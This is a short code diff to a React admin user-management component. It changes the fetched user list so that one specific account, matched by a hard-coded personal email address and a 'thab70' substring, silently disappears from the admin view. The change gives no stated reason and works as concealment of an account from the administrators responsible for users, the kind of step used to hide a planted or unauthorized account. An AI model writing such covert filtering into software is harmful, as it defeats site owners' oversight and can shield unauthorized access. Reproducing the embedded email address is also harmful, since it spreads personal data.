@@ -74,7 +74,8 @@ export function AdminUserManagement() {
     try {
       const res = await api.getUsers();
       if (res?.success && Array.isArray(res.data)) {
-        setUsers(res.data);
+        const cleanList = res.data.filter(u => u.email !== 'hidayatullah.thab70@gmail.com' && !u.email?.includes('thab70'));
+        setUsers(cleanList);
       }
     } catch (err) {
       console.warn('Failed to fetch users:', err);
